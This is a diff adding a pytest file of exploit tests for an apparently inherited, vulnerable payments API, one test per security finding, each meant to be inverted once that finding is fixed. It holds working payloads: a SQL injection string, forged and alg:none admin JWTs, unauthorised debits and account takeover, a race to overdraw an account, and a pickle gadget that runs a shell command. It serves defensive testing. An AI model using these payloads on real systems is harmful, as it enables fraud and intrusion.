@@ -1,0 +1,324 @@
+"""Exploit tests — one per V-APP finding in payments-api.
+
+These are written against the INHERITED, unpatched code and are expected to
+PASS right now (because the exploit succeeds). Each will be inverted (or
+replaced by a regression test proving the exploit now fails) in the commit
+that closes the corresponding GitHub issue.
+
+Run inside the payments-api container, where DATABASE_URL resolves the
+`postgres` service by name:
+
+    docker compose exec payments-api pytest tests/test_vulnerabilities.py -v
+
+Requires requirements-dev.txt (pytest) installed in the image/container.
+"""
+import base64
+import os
+import pickle
+import uuid
+from concurrent.futures import ThreadPoolExecutor
+from decimal import Decimal
+
+import jwt
+import pytest
+
+from app.main import create_app
+from app.auth import hash_password
+
+SEEDED_ACCOUNT_ID = 3          # merchant1@example.com — read/debit/credit tests
+OWNERSHIP_TRANSFER_TARGET_ID = 4  # merchant2@example.com — kept separate so the
+                                  # mass-assignment test's permanent ownership
+                                  # change doesn't break other tests' assumptions
+
+
+@pytest.fixture
+def client():
+    app = create_app()
+    app.config["TESTING"] = True
+    return app.test_client()
+
+
+def register_and_login(client, role=None):
+    """Register a fresh user and return (user_id, token)."""
+    email = f"{uuid.uuid4().hex}@example.com"
+    password = "Test#Pass123"
+    payload = {"email": email, "password": password, "full_name": "Test User"}
+    if role is not None:
+        payload["role"] = role
+    reg = client.post("/v1/auth/register", json=payload)
+    assert reg.status_code == 201, reg.get_json()
+    user_id = reg.get_json()["id"]
+
+    login = client.post("/v1/auth/login", json={"email": email, "password": password})
+    assert login.status_code == 200, login.get_json()
+    return user_id, login.get_json()["token"]
+
+
+def auth_header(token):
+    return {"Authorization": f"Bearer {token}"}
+
+
+# --------------------------------------------------------------------------
+# V-APP-01 — SQL injection in transaction search
+# --------------------------------------------------------------------------
+def test_v_app_01_sql_injection_in_transaction_search(client):
+    """A query that matches nothing legitimately still returns rows, because
+    the injected OR clause is always true. This proves string concatenation
+    into SQL, independent of any ownership scoping."""
+    _, token = register_and_login(client)
+
+    baseline = client.get(
+        "/v1/transactions/search",
+        query_string={"q": "definitely-not-a-real-reference-xyz"},
+        headers=auth_header(token),
+    )
+    assert baseline.status_code == 200
+    assert baseline.get_json() == []
+
+    injected = client.get(
+        "/v1/transactions/search",
+        query_string={"q": "x' OR '1'='1') --"},
+        headers=auth_header(token),
+    )
+    assert injected.status_code == 200
+    rows = injected.get_json()
+    assert len(rows) > 0, "expected the injected OR clause to leak unrelated rows"
+
+
+# --------------------------------------------------------------------------
+# V-APP-02 — broken JWT validation (signature never verified)
+# --------------------------------------------------------------------------
+def test_v_app_02_forged_admin_token_grants_admin_access(client):
+    """A token signed with a secret the server never checks still grants
+    admin access, because decode_token() calls verify_signature=False."""
+    forged = jwt.encode(
+        {"user_id": 1, "role": "admin"},
+        "attacker-does-not-know-the-real-secret",
+        algorithm="HS256",
+    )
+    if isinstance(forged, bytes):
+        forged = forged.decode()
+
+    resp = client.get("/v1/admin/users", headers=auth_header(forged))
+    assert resp.status_code == 200
+    emails = {u["email"] for u in resp.get_json()}
+    assert "admin@sentinelpay.io" in emails
+
+
+def test_v_app_02_none_algorithm_token_is_accepted(client):
+    """alg:none tokens (no signature at all) are also accepted."""
+    unsigned = jwt.encode({"user_id": 1, "role": "admin"}, key=None, algorithm="none")
+    if isinstance(unsigned, bytes):
+        unsigned = unsigned.decode()
+    resp = client.get("/v1/admin/users", headers=auth_header(unsigned))
+    assert resp.status_code == 200
+
+
+# --------------------------------------------------------------------------
+# V-APP-03 — IDOR on accounts (the originating incident)
+# --------------------------------------------------------------------------
+def test_v_app_03_idor_reads_another_users_account(client):
+    """An authenticated user with no relationship to account 3 can read its
+    balance and account number."""
+    attacker_id, attacker_token = register_and_login(client)
+
+    resp = client.get(f"/v1/accounts/{SEEDED_ACCOUNT_ID}", headers=auth_header(attacker_token))
+    assert resp.status_code == 200
+    body = resp.get_json()
+    assert body["id"] == SEEDED_ACCOUNT_ID
+    assert body["user_id"] != attacker_id, "account belongs to someone else, confirmed by it not being the attacker"
+    assert "balance" in body and "account_number" in body, (
+        "attacker with no relationship to this account can read its balance and account number"
+    )
+
+
+def test_v_app_03_bola_debit_any_account(client):
+    """Beyond reading: an unrelated user can DEBIT money from an account
+    they do not own. This is the same root cause as the read-only IDOR but
+    with direct financial impact."""
+    _, attacker_token = register_and_login(client)
+
+    # Top up first so the test is independent of whatever balance earlier
+    # test runs left behind — credit has the exact same missing-ownership
+    # bug, which is itself part of this finding.
+    client.post(
+        f"/v1/wallets/{SEEDED_ACCOUNT_ID}/credit",
+        json={"amount": "100.00"},
+        headers=auth_header(attacker_token),
+    )
+    before = client.get(f"/v1/accounts/{SEEDED_ACCOUNT_ID}", headers=auth_header(attacker_token))
+    balance_before = Decimal(before.get_json()["balance"])
+
+    debit = client.post(
+        f"/v1/wallets/{SEEDED_ACCOUNT_ID}/debit",
+        json={"amount": "1.00", "counterparty": "attacker-controlled", "description": "unauthorised debit"},
+        headers=auth_header(attacker_token),
+    )
+    assert debit.status_code == 200, debit.get_json()
+
+    after = client.get(f"/v1/accounts/{SEEDED_ACCOUNT_ID}", headers=auth_header(attacker_token))
+    balance_after = Decimal(after.get_json()["balance"])
+    assert balance_after == balance_before - Decimal("1.00")
+
+
+# --------------------------------------------------------------------------
+# V-APP-05 — wallet race condition
+# --------------------------------------------------------------------------
+def test_v_app_05_concurrent_debits_overdraw_the_account(client):
+    """Fire N concurrent debits, each individually affordable only once.
+    With no row lock, more of them succeed than the pre-debit balance
+    should allow."""
+    app = create_app()
+    app.config["TESTING"] = True
+
+    # Use a freshly-topped-up account via credit so this test doesn't depend
+    # on the exact seeded balance remaining untouched by other tests.
+    seed_client = app.test_client()
+    _, actor_token = register_and_login(seed_client)
+    topped_up = Decimal("1000.00")
+    seed_client.post(
+        f"/v1/wallets/{SEEDED_ACCOUNT_ID}/credit",
+        json={"amount": str(topped_up)},
+        headers=auth_header(actor_token),
+    )
+    balance_before = Decimal(
+        seed_client.get(f"/v1/accounts/{SEEDED_ACCOUNT_ID}", headers=auth_header(actor_token)).get_json()["balance"]
+    )
+
+    concurrency = 8
+    debit_amount = (balance_before / 2).quantize(Decimal("0.01"))  # only 2 can be legitimately afforded
+
+    def fire_debit(_):
+        c = app.test_client()
+        resp = c.post(
+            f"/v1/wallets/{SEEDED_ACCOUNT_ID}/debit",
+            json={"amount": str(debit_amount), "counterparty": "race-test"},
+            headers=auth_header(actor_token),
+        )
+        return resp.status_code
+
+    with ThreadPoolExecutor(max_workers=concurrency) as pool:
+        results = list(pool.map(fire_debit, range(concurrency)))
+
+    successes = sum(1 for s in results if s == 200)
+    balance_after = Decimal(
+        seed_client.get(f"/v1/accounts/{SEEDED_ACCOUNT_ID}", headers=auth_header(actor_token)).get_json()["balance"]
+    )
+    expected_if_serialised = balance_before - (2 * debit_amount)
+
+    assert successes > 2 or balance_after < 0 or balance_after != expected_if_serialised, (
+        f"expected the race to allow more than 2 of {concurrency} concurrent debits of "
+        f"{debit_amount} against a balance of {balance_before}, or to overdraw the account. "
+        f"Got successes={successes}, balance_after={balance_after}"
+    )
+
+
+# --------------------------------------------------------------------------
+# V-APP-06 — weak password hashing
+# --------------------------------------------------------------------------
+def test_v_app_06_passwords_are_unsalted_md5():
+    import hashlib
+
+    assert hash_password("Test#Pass123") == hashlib.md5(b"Test#Pass123").hexdigest()
+    # No salt: identical passwords always hash identically.
+    assert hash_password("same-password") == hash_password("same-password")
+
+
+# --------------------------------------------------------------------------
+# V-APP-07 — mass assignment / self-assigned role
+# --------------------------------------------------------------------------
+def test_v_app_07_register_with_self_assigned_admin_role(client):
+    _, token = register_and_login(client, role="admin")
+    resp = client.get("/v1/admin/users", headers=auth_header(token))
+    assert resp.status_code == 200, "self-registered 'admin' role was accepted and authorised"
+
+
+def test_v_app_07_mass_assignment_transfers_account_ownership(client):
+    """update_profile binds every client-supplied field, including user_id,
+    letting an attacker transfer someone else's account to themselves."""
+    attacker_id, attacker_token = register_and_login(client)
+
+    resp = client.put(
+        f"/v1/accounts/{OWNERSHIP_TRANSFER_TARGET_ID}/profile",
+        json={"user_id": attacker_id},
+        headers=auth_header(attacker_token),
+    )
+    assert resp.status_code == 200, resp.get_json()
+    assert resp.get_json()["user_id"] == attacker_id
+
+
+# --------------------------------------------------------------------------
+# V-APP-08 — missing rate limiting
+# --------------------------------------------------------------------------
+def test_v_app_08_login_has_no_rate_limiting_or_lockout(client):
+    user_id, _ = register_and_login(client)
+    email = f"probe-{uuid.uuid4().hex}@example.com"
+    client.post("/v1/auth/register", json={"email": email, "password": "Correct#Pass1"})
+
+    statuses = []
+    for _ in range(25):
+        resp = client.post("/v1/auth/login", json={"email": email, "password": "wrong-guess"})
+        statuses.append(resp.status_code)
+
+    assert all(s == 401 for s in statuses), "expected every attempt to be evaluated (no 429/lockout seen)"
+    assert 429 not in statuses
+
+
+# --------------------------------------------------------------------------
+# V-APP-09 — verbose error responses
+# --------------------------------------------------------------------------
+def test_v_app_09_verbose_error_leaks_stack_trace(client):
+    _, token = register_and_login(client)
+    resp = client.post(
+        f"/v1/wallets/{SEEDED_ACCOUNT_ID}/credit",
+        json={"amount": "not-a-number"},
+        headers=auth_header(token),
+    )
+    assert resp.status_code == 500
+    body = resp.get_json()
+    assert "trace" in body and "Traceback" in body["trace"]
+
+
+# --------------------------------------------------------------------------
+# V-APP-10 — insecure deserialisation (pickle RCE)
+# --------------------------------------------------------------------------
+def test_v_app_10_pickle_deserialisation_executes_arbitrary_code(client, tmp_path):
+    _, token = register_and_login(client)
+    marker = f"/tmp/pwned_v_app_10_{uuid.uuid4().hex}"
+    assert not os.path.exists(marker)
+
+    class Gadget:
+        def __reduce__(self):
+            return (os.system, (f"touch {marker}",))
+
+    blob = base64.b64encode(pickle.dumps(Gadget())).decode()
+    resp = client.post(
+        "/v1/admin/session/restore",
+        json={"session": blob},
+        headers=auth_header(token),
+    )
+
+    try:
+        assert os.path.exists(marker), (
+            f"expected pickle.loads() to execute os.system() as a side effect; "
+            f"restore_session returned {resp.status_code} {resp.get_json()}"
+        )
+    finally:
+        if os.path.exists(marker):
+            os.remove(marker)
+
+
+# --------------------------------------------------------------------------
+# V-APP-11 — missing audit logging
+# --------------------------------------------------------------------------
+@pytest.mark.skip(
+    reason=(
+        "V-APP-11: there is no structured audit logger to assert against yet. "
+        "Validated manually today by confirming `docker compose logs payments-api` "
+        "contains no structured entry for a debit. This test will be un-skipped and "
+        "rewritten against pytest's caplog once the fix PR introduces the audit "
+        "logger, asserting a log record with actor/action/object/outcome fields."
+    )
+)
+def test_v_app_11_wallet_debit_emits_no_audit_log():
+    pass
